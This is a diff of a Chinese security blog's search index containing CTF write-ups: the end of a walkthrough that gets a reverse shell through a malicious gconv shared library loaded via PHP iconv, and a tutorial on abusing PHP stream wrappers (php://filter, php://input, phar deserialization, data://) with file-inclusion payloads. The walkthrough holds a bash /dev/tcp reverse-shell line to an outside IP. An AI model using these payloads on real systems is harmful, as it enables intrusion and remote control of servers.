class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;upload&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;flare&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>],<span class="string">&quot;/tmp/&quot;</span>.<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>编码进行绕过，再复制一份之前的<strong>s2.php</strong>更名为<strong>s4.php</strong>作为上传点，包含文件换成<strong>s3.php</strong>就好。</p>
+<p>下面制作exp所需文件</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">gconv</span><span class="params">()</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">gconv_init</span><span class="params">()</span> &#123;</span><br><span class="line">  system(<span class="string">&quot;bash -c &#x27;exec bash -i &amp;&gt;/dev/tcp/233.33.3.333/2333 &lt;&amp;1&#x27;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>编译成<strong>so</strong>文件</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc exp.c -o exp.so -shared -fPIC</span><br></pre></td></tr></table></figure>
+
+<p>书写<strong>gconv-modules</strong>文件</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">module  EXP<span class="regexp">//</span>    INTERNAL    ..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>tmp/exp    <span class="number">2</span></span><br><span class="line">module  INTERNAL    EXP<span class="regexp">//</span>    ..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>tmp/exp    <span class="number">2</span></span><br></pre></td></tr></table></figure>
+
+<p>之后去手动构造的上传点<strong>s4.php</strong>上传这两个文件，再去webshell页面<strong>s2.php</strong>执行下面的代码触发exp，完成反弹shell。</p>
+<figure class="highlight maxima"><table><tr><td class="code"><pre><span class="line">sh=putenv(<span class="string">&quot;GCONV_PATH=/tmp/&quot;</span>);include(&#x27;php://filter/<span class="built_in">read</span>=<span class="built_in">convert</span>.iconv.<span class="built_in">exp</span>.utf-<span class="number">8</span>/resource=/tmp/<span class="built_in">exp</span>.so&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>查看flag权限，发现只有root能读</p>
+<p><img src="/images/BUU/20220412213148.png"></p>
+<p>康康suid命令</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find /usr/bin -user root -perm -4000 -print 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p><code>nl</code>能用，虚惊一场（我在期待什么啊可恶</p>
+<p><img src="/images/BUU/20220412212616.png"></p>
+]]></content>
+      <tags>
+        <tag>php</tag>
+        <tag>upload</tag>
+        <tag>python</tag>
       </tags>
   </entry>
   <entry>
@@ -998,6 +998,120 @@
       </tags>
   </entry>
   <entry>
+    <title>关于php伪协议</title>
+    <url>/2021/12/21/php-pseudo-protocol/</url>
+    <content><![CDATA[<p>入坑以来，练习周大福的时候经常遇到php伪协议的考点。不管是考到数据过滤还是和其它函数配合读取信息，总是不能第一时间反应过来有个php伪协议可以帮忙解决问题。</p>
+<p>写这篇笔记的目的便是粗略地回顾一下有关php伪协议的知识，同时再加深一些对它的印象和理解了。</p>
+<p>希望自己以后不要再被这个考点麻住了的说</p>
+<p><a href="https://www.bilibili.com/video/BV1XM4y1c7Jp"><del>大学期末赛高考 下一篇又得拖到什么时候哦（瘫</del></a></p>
+<span id="more"></span>
+
+<h1 id="食材准备"><a href="#食材准备" class="headerlink" title="食材准备"></a>食材准备</h1><p>所谓php伪协议，其实就是<a href="https://www.php.net/manual/zh/wrappers.php">php支持的协议和封装协议</a></p>
+<p>支持的种类分为十二种：</p>
+<p>file:// — 访问本地文件系统</p>
+<p>http:// – https:// — 访问 HTTP(s) 网址</p>
+<p>ftp:// – ftps:// — 访问 FTP(s) URLs</p>
+<p>php:// — 访问各个输入/输出流（I/O streams）</p>
+<p>zlib:// – bzip2:// – zip:// — 压缩流</p>
+<p>data:// — 数据（RFC 2397）</p>
+<p>glob:// — 查找匹配的文件路径模式</p>
+<p>phar:// — PHP 归档</p>
+<p>ssh2:// — Secure Shell 2</p>
+<p>rar:// — RAR</p>
+<p>ogg:// — 音频流</p>
+<p>expect:// — 处理交互式的流</p>
+<p>这里从练习考点出现的频率来看的话，我们先把重心放在 <strong>php:// file:// phar:// data:// glob://</strong> 这五个的用法上</p>
+<p>不能说其它的就可以晾在一边一点也不去学了 只是从现阶段能花的学习时间来看，暂时不应该对它们投入太多时间成本。</p>
+<h1 id="厨房交响"><a href="#厨房交响" class="headerlink" title="厨房交响"></a>厨房交响</h1><h2 id="php-filter-—-你吧来拿"><a href="#php-filter-—-你吧来拿" class="headerlink" title="php://filter — 你吧来拿"></a>php://filter — 你吧来拿</h2><p>可以说这是最常使用的一个伪协议，一般可以利用其造成文件源码泄露。</p>
+<blockquote>
+<p>php://filter 是一种元封装器，设计用于数据流打开时的筛选过滤应用。</p>
+<p>这对于一体式（all-in-one）的文件函数非常有用，例如<code>readfile()</code>、<code>file()</code>和<code>file_get_contents()</code>。</p>
+</blockquote>
+<p>常用参数概览</p>
+<blockquote>
+<p>resource=&lt;要过滤的数据流&gt; 这个参数是必须的。它指定了你要筛选过滤的数据流。</p>
+<p>read=&lt;读链的筛选列表&gt; 该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</p>
+<p>write=&lt;写链的筛选列表&gt;     该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</p>
+</blockquote>
+<p>常用过滤器</p>
+<blockquote>
+<p>convert.base64-encode &amp; convert.base64-decode</p>
+<p>使用这两个过滤器等同于分别用<code>base64_encode()</code>和<code>base64_decode()</code>函数处理所有的流数据。</p>
+</blockquote>
+<h3 id="本地试吃"><a href="#本地试吃" class="headerlink" title="本地试吃"></a>本地试吃</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>);</span><br></pre></td></tr></table></figure>
+
+<p>此时index.php的同级目录下有个叫做test.txt的文件。</p>
+<p>试图读取里面的信息</p>
+<p><img src="/images/BUU/202112211700194.png"></p>
+<p>不对啊，我明明往里面写了东西的呢</p>
+<p>让我们用过滤器看看是怎么回事</p>
+<p><img src="/images/BUU/202112211703524.png"></p>
+<p>然后编回来</p>
+<p><img src="/images/BUU/202112211711151.png"></p>
+<p>这样做的好处就是如果不进行编码，文件包含后就不会有输出结果，而是当做php文件执行了，通过编码后则可以读取文件源码。</p>
+<h2 id="php-input-—-这是替身攻击"><a href="#php-input-—-这是替身攻击" class="headerlink" title="php://input — 这是替身攻击"></a>php://input — 这是替身攻击</h2><blockquote>
+<p><strong>php://input</strong>是个可以访问请求的原始数据的只读流。POST请求少的情况下，最好使用<strong>php://input</strong>来代替 <strong>$HTTP_RAW_POST_DATA</strong>（原生的POST数据），因为它不依赖于特定的<strong>php.ini</strong>指令，内存消耗更少。</p>
+</blockquote>
+<p>那既然都提到POST了，能不带GET玩嘛~</p>
+<h3 id="本地试吃-1"><a href="#本地试吃-1" class="headerlink" title="本地试吃"></a>本地试吃</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// index.php 典中典文件包含漏洞</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]);</span><br></pre></td></tr></table></figure>
+
+<p>试图搞事</p>
+<p><img src="/images/BUU/202112211942039.png"></p>
+<p>搞事未遂 雀食 include的再怎么说也得是个文件名嘛</p>
+<p><strong>替 身 觉 醒</strong></p>
+<p><img src="/images/BUU/202112211952241.png"></p>
+<p><strong>ohhhhhhhhhhhhhhhhhhhhhhhhhhhh</strong></p>
+<p>这是什么情况呢……简直<strong>就像是include了一个写着phpinfo()的文件一样</strong>的说</p>
+<p>某些情况下 绕过GET型传参的waf很好用。</p>
+<p>要说更底层的细节的话，本蒟蒻雀食暂时也还没搞懂，正在往死里补，求暂时放过&gt;_&lt;</p>
+<h2 id="file-—-让我访问你网站正不正常啊"><a href="#file-—-让我访问你网站正不正常啊" class="headerlink" title="file:// — 让我访问你网站正不正常啊"></a>file:// — 让我访问你网站正不正常啊</h2><p>通过<strong>file</strong>协议可以访问本地文件系统。</p>
+<p>在浏览器地址栏输入<strong>file</strong>协议可像资源管理器一样读取本地文件。（毕竟还是 <strong>浏览</strong> 器嘛~</p>
+<p><img src="/images/BUU/202112211522406.png"></p>
+<p>在建立了远程连接的情况下再通过php函数配合<strong>file</strong>协议读取文件，就能做到服务端任意文件读取。</p>
+<p><a href="https://websec.readthedocs.io/zh/latest/vuln/ssrf.html"><strong>SSRF</strong></a>（服务端请求伪造，<strong>Server Side Request Forgery</strong>）常用手段。</p>
+<h3 id="本地试吃-2"><a href="#本地试吃-2" class="headerlink" title="本地试吃"></a>本地试吃</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 梅开二度</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">//</span> payload</span><br><span class="line">?file=file:<span class="regexp">//</span>D:\phpStudy\PHPTutorial\WWW\l.txt</span><br></pre></td></tr></table></figure>
+
+<p>网上的其它演示都可以打开相对路径的文件 我这设置改来改去还是只能访问绝对路径文件 怪</p>
+<p><img src="/images/BUU/202112212116212.png"></p>
+<h2 id="phar-—-有基佬开我裤链"><a href="#phar-—-有基佬开我裤链" class="headerlink" title="phar:// — 有基佬开我裤链"></a>phar:// — 有基佬开我裤链</h2><p><strong>phar</strong> (“Php ARchive”) 是php里类似于<strong>jar</strong>的一种打包文件</p>
+<p>在周大福里经常作为反序列化考点出现。</p>
+<p>此漏洞利用在Blackhat2018大会上首次提出（大佬们tql），利用这种方法可以在不使用<code>unserialize()</code>函数的情况下触发php反序列化漏洞。</p>
+<h3 id="本地试吃-3"><a href="#本地试吃-3" class="headerlink" title="本地试吃"></a>本地试吃</h3><p>我们先试着创建一个phar文件</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">aa</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span> = <span class="string">&quot;test&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">aa</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure>
+
+<p><strong>注意：要将php.ini中的phar.readonly选项设置为Off，否则无法生成phar文件</strong></p>
+<p>现在我们服务器（127.0.0.1）上就有了一个phar文件。</p>
+<p>phar文件中被压缩的文件的一些信息，其中<strong>meta-data</strong>部分的信息会以序列化的形式储存，这里就是漏洞利用的关键点</p>
+<p>用<strong>010Editor</strong>打开，可以看到<strong>meta-data</strong>是以序列化的形式存储的</p>
+<p><img src="/images/BUU/202112211610188.png"></p>
+<p>那么有序列化数据必然会有反序列化操作，php大部分的文件系统函数在通过phar://伪协议解析phar文件时，都会将<strong>meta-data</strong>进行反序列化</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">aa</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;phar://phar.phar&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/BUU/202112211623190.png"></p>
+<p>只要将phar文件中的<strong>meta-data</strong>换成恶意代码，即可触发反序列化漏洞。</p>
+<p><strong>一种经典周大福</strong></p>
+<p>我称之为<strong>文件查看器</strong>型，通常是有一个上传文件点，一个文件包含点。上传点<strong>一般限制得很死</strong>，图片马什么的想都不要想。phar后缀只要没被限制，就可以先上传有恶意代码的phar文件，再利用文件包含点将其反序列化的同时触发恶意代码。</p>
+<h2 id="data-—-皇军托我给您带个话"><a href="#data-—-皇军托我给您带个话" class="headerlink" title="data:// — 皇军托我给您带个话"></a>data:// — 皇军托我给您带个话</h2><p>一种数据流封装器，用来传递相应格式的数据。通常可以用来执行php代码。</p>
+<p>data://协议必须在<strong>allow_url_fopen</strong>和<strong>allow_url_include</strong>双On才能使用。</p>
+<h3 id="本地试吃-4"><a href="#本地试吃-4" class="headerlink" title="本地试吃"></a>本地试吃</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 帽子戏法</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">// payload <span class="number">1</span></span><br><span class="line">?file=data:<span class="regexp">//</span>text/plain,%<span class="number">3</span>C%3Fphp+phpinfo%28%29%3B // 防止特殊字符如<span class="string">&#x27;&lt;&gt;&#x27;</span>解析出错进行一次urlencode()</span><br><span class="line"></span><br><span class="line">// payload <span class="number">2</span></span><br><span class="line">?file=data:<span class="regexp">//</span>text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg== <span class="regexp">//</span> base64同理</span><br></pre></td></tr></table></figure>
+<p><img src="/images/BUU/202112212011428.png"></p>
+<h2 id="glob-—-我来了就是查寝来了"><a href="#glob-—-我来了就是查寝来了" class="headerlink" title="glob:// — 我来了就是查寝来了"></a>glob:// — 我来了就是查寝来了</h2><p>php中的<code>DirectoryIterator</code>类提供了一个用于查看文件系统目录内容的简单接口。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$it</span> = <span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$it</span> <span class="keyword">as</span> <span class="variable">$f</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">printf</span>(<span class="string">&quot;%s&quot;</span>, <span class="variable">$f</span>-&gt;<span class="title function_ invoke__">getFilename</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>上面这段代码实现了一个简单的文件查看器的功能。</p>
+<p><img src="/images/BUU/202112262150620.png"></p>
+<p>glob协议可以借此查找匹配的文件路径，更精确地查找文件。</p>
+<p><img src="/images/BUU/202112262157376.png"></p>
+]]></content>
+      <tags>
+        <tag>php</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>域肾透——从看懂到看开 0x00</title>
     <url>/2022/03/09/computer-networks-basic/</url>
     <content><![CDATA[<p>时隔半个月断断续续，润掉四节坐牢历史课，终于结束了这篇新文章（瘫</p>
@@ -1112,120 +1226,6 @@
       <tags>
         <tag>Computer Networks</tag>
         <tag>Intranet penetration</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>关于php伪协议</title>
-    <url>/2021/12/21/php-pseudo-protocol/</url>
-    <content><![CDATA[<p>入坑以来，练习周大福的时候经常遇到php伪协议的考点。不管是考到数据过滤还是和其它函数配合读取信息，总是不能第一时间反应过来有个php伪协议可以帮忙解决问题。</p>
-<p>写这篇笔记的目的便是粗略地回顾一下有关php伪协议的知识，同时再加深一些对它的印象和理解了。</p>
-<p>希望自己以后不要再被这个考点麻住了的说</p>
-<p><a href="https://www.bilibili.com/video/BV1XM4y1c7Jp"><del>大学期末赛高考 下一篇又得拖到什么时候哦（瘫</del></a></p>
-<span id="more"></span>
-
-<h1 id="食材准备"><a href="#食材准备" class="headerlink" title="食材准备"></a>食材准备</h1><p>所谓php伪协议，其实就是<a href="https://www.php.net/manual/zh/wrappers.php">php支持的协议和封装协议</a></p>
-<p>支持的种类分为十二种：</p>
-<p>file:// — 访问本地文件系统</p>
-<p>http:// – https:// — 访问 HTTP(s) 网址</p>
-<p>ftp:// – ftps:// — 访问 FTP(s) URLs</p>
-<p>php:// — 访问各个输入/输出流（I/O streams）</p>
-<p>zlib:// – bzip2:// – zip:// — 压缩流</p>
-<p>data:// — 数据（RFC 2397）</p>
-<p>glob:// — 查找匹配的文件路径模式</p>
-<p>phar:// — PHP 归档</p>
-<p>ssh2:// — Secure Shell 2</p>
-<p>rar:// — RAR</p>
-<p>ogg:// — 音频流</p>
-<p>expect:// — 处理交互式的流</p>
-<p>这里从练习考点出现的频率来看的话，我们先把重心放在 <strong>php:// file:// phar:// data:// glob://</strong> 这五个的用法上</p>
-<p>不能说其它的就可以晾在一边一点也不去学了 只是从现阶段能花的学习时间来看，暂时不应该对它们投入太多时间成本。</p>
-<h1 id="厨房交响"><a href="#厨房交响" class="headerlink" title="厨房交响"></a>厨房交响</h1><h2 id="php-filter-—-你吧来拿"><a href="#php-filter-—-你吧来拿" class="headerlink" title="php://filter — 你吧来拿"></a>php://filter — 你吧来拿</h2><p>可以说这是最常使用的一个伪协议，一般可以利用其造成文件源码泄露。</p>
-<blockquote>
-<p>php://filter 是一种元封装器，设计用于数据流打开时的筛选过滤应用。</p>
-<p>这对于一体式（all-in-one）的文件函数非常有用，例如<code>readfile()</code>、<code>file()</code>和<code>file_get_contents()</code>。</p>
-</blockquote>
-<p>常用参数概览</p>
-<blockquote>
-<p>resource=&lt;要过滤的数据流&gt; 这个参数是必须的。它指定了你要筛选过滤的数据流。</p>
-<p>read=&lt;读链的筛选列表&gt; 该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</p>
-<p>write=&lt;写链的筛选列表&gt;     该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</p>
-</blockquote>
-<p>常用过滤器</p>
-<blockquote>
-<p>convert.base64-encode &amp; convert.base64-decode</p>
-<p>使用这两个过滤器等同于分别用<code>base64_encode()</code>和<code>base64_decode()</code>函数处理所有的流数据。</p>
-</blockquote>
-<h3 id="本地试吃"><a href="#本地试吃" class="headerlink" title="本地试吃"></a>本地试吃</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>);</span><br></pre></td></tr></table></figure>
-
-<p>此时index.php的同级目录下有个叫做test.txt的文件。</p>
-<p>试图读取里面的信息</p>
-<p><img src="/images/BUU/202112211700194.png"></p>
-<p>不对啊，我明明往里面写了东西的呢</p>
-<p>让我们用过滤器看看是怎么回事</p>
-<p><img src="/images/BUU/202112211703524.png"></p>
-<p>然后编回来</p>
-<p><img src="/images/BUU/202112211711151.png"></p>
-<p>这样做的好处就是如果不进行编码，文件包含后就不会有输出结果，而是当做php文件执行了，通过编码后则可以读取文件源码。</p>
-<h2 id="php-input-—-这是替身攻击"><a href="#php-input-—-这是替身攻击" class="headerlink" title="php://input — 这是替身攻击"></a>php://input — 这是替身攻击</h2><blockquote>
-<p><strong>php://input</strong>是个可以访问请求的原始数据的只读流。POST请求少的情况下，最好使用<strong>php://input</strong>来代替 <strong>$HTTP_RAW_POST_DATA</strong>（原生的POST数据），因为它不依赖于特定的<strong>php.ini</strong>指令，内存消耗更少。</p>
-</blockquote>
-<p>那既然都提到POST了，能不带GET玩嘛~</p>
-<h3 id="本地试吃-1"><a href="#本地试吃-1" class="headerlink" title="本地试吃"></a>本地试吃</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// index.php 典中典文件包含漏洞</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]);</span><br></pre></td></tr></table></figure>
-
-<p>试图搞事</p>
-<p><img src="/images/BUU/202112211942039.png"></p>
-<p>搞事未遂 雀食 include的再怎么说也得是个文件名嘛</p>
-<p><strong>替 身 觉 醒</strong></p>
-<p><img src="/images/BUU/202112211952241.png"></p>
-<p><strong>ohhhhhhhhhhhhhhhhhhhhhhhhhhhh</strong></p>
-<p>这是什么情况呢……简直<strong>就像是include了一个写着phpinfo()的文件一样</strong>的说</p>
-<p>某些情况下 绕过GET型传参的waf很好用。</p>
-<p>要说更底层的细节的话，本蒟蒻雀食暂时也还没搞懂，正在往死里补，求暂时放过&gt;_&lt;</p>
-<h2 id="file-—-让我访问你网站正不正常啊"><a href="#file-—-让我访问你网站正不正常啊" class="headerlink" title="file:// — 让我访问你网站正不正常啊"></a>file:// — 让我访问你网站正不正常啊</h2><p>通过<strong>file</strong>协议可以访问本地文件系统。</p>
-<p>在浏览器地址栏输入<strong>file</strong>协议可像资源管理器一样读取本地文件。（毕竟还是 <strong>浏览</strong> 器嘛~</p>
-<p><img src="/images/BUU/202112211522406.png"></p>
-<p>在建立了远程连接的情况下再通过php函数配合<strong>file</strong>协议读取文件，就能做到服务端任意文件读取。</p>
-<p><a href="https://websec.readthedocs.io/zh/latest/vuln/ssrf.html"><strong>SSRF</strong></a>（服务端请求伪造，<strong>Server Side Request Forgery</strong>）常用手段。</p>
-<h3 id="本地试吃-2"><a href="#本地试吃-2" class="headerlink" title="本地试吃"></a>本地试吃</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 梅开二度</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]);</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">//</span> payload</span><br><span class="line">?file=file:<span class="regexp">//</span>D:\phpStudy\PHPTutorial\WWW\l.txt</span><br></pre></td></tr></table></figure>
-
-<p>网上的其它演示都可以打开相对路径的文件 我这设置改来改去还是只能访问绝对路径文件 怪</p>
-<p><img src="/images/BUU/202112212116212.png"></p>
-<h2 id="phar-—-有基佬开我裤链"><a href="#phar-—-有基佬开我裤链" class="headerlink" title="phar:// — 有基佬开我裤链"></a>phar:// — 有基佬开我裤链</h2><p><strong>phar</strong> (“Php ARchive”) 是php里类似于<strong>jar</strong>的一种打包文件</p>
-<p>在周大福里经常作为反序列化考点出现。</p>
-<p>此漏洞利用在Blackhat2018大会上首次提出（大佬们tql），利用这种方法可以在不使用<code>unserialize()</code>函数的情况下触发php反序列化漏洞。</p>
-<h3 id="本地试吃-3"><a href="#本地试吃-3" class="headerlink" title="本地试吃"></a>本地试吃</h3><p>我们先试着创建一个phar文件</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">aa</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span> = <span class="string">&quot;test&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">aa</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure>
-
-<p><strong>注意：要将php.ini中的phar.readonly选项设置为Off，否则无法生成phar文件</strong></p>
-<p>现在我们服务器（127.0.0.1）上就有了一个phar文件。</p>
-<p>phar文件中被压缩的文件的一些信息，其中<strong>meta-data</strong>部分的信息会以序列化的形式储存，这里就是漏洞利用的关键点</p>
-<p>用<strong>010Editor</strong>打开，可以看到<strong>meta-data</strong>是以序列化的形式存储的</p>
-<p><img src="/images/BUU/202112211610188.png"></p>
-<p>那么有序列化数据必然会有反序列化操作，php大部分的文件系统函数在通过phar://伪协议解析phar文件时，都会将<strong>meta-data</strong>进行反序列化</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">aa</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;phar://phar.phar&#x27;</span>);</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/BUU/202112211623190.png"></p>
-<p>只要将phar文件中的<strong>meta-data</strong>换成恶意代码，即可触发反序列化漏洞。</p>
-<p><strong>一种经典周大福</strong></p>
-<p>我称之为<strong>文件查看器</strong>型，通常是有一个上传文件点，一个文件包含点。上传点<strong>一般限制得很死</strong>，图片马什么的想都不要想。phar后缀只要没被限制，就可以先上传有恶意代码的phar文件，再利用文件包含点将其反序列化的同时触发恶意代码。</p>
-<h2 id="data-—-皇军托我给您带个话"><a href="#data-—-皇军托我给您带个话" class="headerlink" title="data:// — 皇军托我给您带个话"></a>data:// — 皇军托我给您带个话</h2><p>一种数据流封装器，用来传递相应格式的数据。通常可以用来执行php代码。</p>
-<p>data://协议必须在<strong>allow_url_fopen</strong>和<strong>allow_url_include</strong>双On才能使用。</p>
-<h3 id="本地试吃-4"><a href="#本地试吃-4" class="headerlink" title="本地试吃"></a>本地试吃</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 帽子戏法</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]);</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">// payload <span class="number">1</span></span><br><span class="line">?file=data:<span class="regexp">//</span>text/plain,%<span class="number">3</span>C%3Fphp+phpinfo%28%29%3B // 防止特殊字符如<span class="string">&#x27;&lt;&gt;&#x27;</span>解析出错进行一次urlencode()</span><br><span class="line"></span><br><span class="line">// payload <span class="number">2</span></span><br><span class="line">?file=data:<span class="regexp">//</span>text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg== <span class="regexp">//</span> base64同理</span><br></pre></td></tr></table></figure>
-<p><img src="/images/BUU/202112212011428.png"></p>
